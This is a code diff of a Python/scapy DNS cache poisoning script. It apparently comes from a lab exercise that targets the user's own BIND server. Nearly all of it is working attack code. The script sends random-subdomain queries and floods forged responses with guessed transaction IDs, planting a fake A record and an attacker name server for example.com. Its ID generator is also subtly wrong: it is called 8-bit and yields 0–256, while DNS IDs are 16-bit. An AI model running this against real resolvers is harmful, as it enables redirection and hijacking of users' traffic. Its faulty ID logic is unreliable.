@@ -7,12 +7,16 @@ from random import randint, choice
 from string import ascii_lowercase, digits
 from subprocess import call
 
+from scapy.layers.dns import DNS, DNSQR, DNSRR
 
 parser = argparse.ArgumentParser()
 parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
-parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
+parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int,
+                    required=True)
 parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=False)
-parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
+parser.add_argument("--query_port",
+                    help="port from where your bind sends DNS queries - query-source port parameter in named.conf",
+                    type=int, required=True)
 args = parser.parse_args()
 
 # your bind's ip address
@@ -27,40 +31,52 @@ my_query_port = args.query_port
 '''
 Generates random strings of length 10.
 '''
+
+
 def getRandomSubDomain():
-	return ''.join(choice(ascii_lowercase + digits) for _ in range (10))
+    return ''.join(choice(ascii_lowercase + digits) for _ in range(10))
+
 
 '''
 Generates random 8-bit integer.
 '''
+
+
 def getRandomTXID():
-	return randint(0, 256)
+    return randint(0, 256)
+
 
 '''
 Sends a UDP packet.
 '''
+
+
 def sendPacket(sock, packet, ip, port):
     sock.sendto(bytes(packet), (ip, port))
+
 
 '''
 Example code that sends a DNS query using scapy.
 '''
+
+
 def spamFakeResponse(target_ip, dns_port, subdomain):
     # in spam response do several things
     # create different TX id, combine them into the response packet
     # same fake name server ns.dnslabattacker.net
-    fake = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    QD = DNSQR(qname = subdomain)
-    AN = DNSRR(rrname = subdomain, ttl = 86400, type = 'A', rdata = "1.2.3.4")
-    NS = DNSRR(rrname = "example.com", ttl = 86400, type='NS', rdata="ns.dnslabattacker.net")
-    response = DNS(id = 1, qr = 1, aa = 1, opcode = 0, rd = 1, ancount = 1, nscount = 1, qdcount = 1, arcount = 0, qd = QD, an = AN, ns = NS)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    fake_qd = DNSQR(qname=subdomain)
+    fake_an = DNSRR(rrname=subdomain, ttl=86400, type='A', rdata="1.2.3.4")
+    fake_ns = DNSRR(rrname="example.com", ttl=3578, type='NS', rdata="ns.dnslabattacker.net")
+    # NS = DNSRR(rrname="example.com", ttl=86400, type='NS', rdata="ns.dnslabattacker.net")
+    response = DNS(id=0, qr=1, opcode=0, aa=1, rd=1, qdcount=1, ancount=1, nscount=1, arcount=0,
+                   qd=fake_qd, an=fake_an, ns=fake_ns)
     if response.ar != None:
+        print("Here")
         del response.ar
-    response.id = getRandomTXID()
-    sendPacket(fake, response, target_ip, dns_port)
-    # print("test")
-
-    fake.close()
+    for i in range(200):
+        response.id = getRandomTXID()
+        sendPacket(sock, response, target_ip, dns_port)
 
 
 if __name__ == '__main__':
@@ -72,16 +88,13 @@ if __name__ == '__main__':
     # keep in mind that there will be two NS for example.com as previous part examined
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-
     while True:
         subdomain = getRandomSubDomain() + ".example.com"
-        dnsPacket = DNS(rd=1, qd=DNSQR(qname = subdomain))
+        dnsPacket = DNS(rd=1, qd=DNSQR(qname=subdomain))
         sendPacket(sock, dnsPacket, my_ip, my_port)
-        print("Queried for:", subdomain) 
+        print(subdomain)
 
-        for _ in range(150):
-            spamFakeResponse(my_ip, my_query_port, subdomain)
-
+        spamFakeResponse(my_ip, my_query_port, subdomain)
         response, _ = sock.recvfrom(4096)
         response = DNS(response)
         if response.an and response.an.rdata == "1.2.3.4":
